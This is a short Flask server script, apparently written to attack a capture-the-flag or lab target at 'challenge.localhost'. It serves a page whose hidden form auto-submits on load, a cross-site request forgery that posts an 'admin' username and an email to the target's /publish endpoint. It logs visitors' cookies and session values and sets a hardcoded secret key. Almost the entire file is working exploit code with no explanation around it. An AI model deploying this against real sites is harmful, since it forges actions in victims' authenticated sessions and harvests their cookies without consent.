from flask import Flask, request, session, redirect
import os

app = Flask(__name__)
app.secret_key = b'static-key-for-dev'  # don't change each run

page = '''<body onload="document.forms[0].submit()">
    <form method="POST" action="http://challenge.localhost/publish">
        <input type="hidden" name="username" value="admin">
        <input type="hidden" name="email" value="jbelkerf@gmail.com">
        <!-- Add more fields if needed -->
    </form>
</body>'''

@app.route("/", methods=["GET"])
def challenge_get():
    print("\n--- Session ---")
    for key, value in dict(session).items():
        print(f"{key} -> {value}")

    print("\n--- Cookies ---")
    for key, value in request.cookies.items():
        print(f"{key} -> {value}")

    print("\n--- Request ---")
    print(request)
    session["username"] = "admin"
    return page

@app.route("/favicon.ico", methods=["GET"])
def challengess_get():
    print("\n--- Session ---")
    for key, value in dict(session).items():
        print(f"{key} -> {value}")

    print("\n--- Cookies ---")
    for key, value in request.cookies.items():
        print(f"{key} -> {value}")

    print("\n--- Request ---")
    print(request)
    session["username"] = "admin"
    return redirect("http://challenge.localhost:80/publish")


# Optional: use local address
app.run("127.0.0.1", 1337)
